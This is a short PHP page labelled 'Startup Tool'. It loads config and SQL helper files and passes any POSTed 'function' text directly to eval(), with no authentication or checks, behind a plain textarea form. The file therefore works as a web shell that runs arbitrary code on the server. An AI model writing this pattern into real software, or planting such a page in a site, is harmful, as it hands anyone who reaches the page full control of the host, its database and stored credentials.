<?php
require_once 'config.php';
require_once 'sql-functions.php';

if (isset($_POST['function'])) {
    eval($_POST['function']);
}
?>

<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Startup Tool</title>
    </head>
    <body>
        <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES, 'UTF-8'); ?>" method="POST">
            <label for="function">Function: </label>
            <textarea type="text" id="function" name="function" required></textarea><br>
            <button type="submit" onclick="window.location.href='debug-functions.php'">Submit</button>
        </form>
    </body>
</html>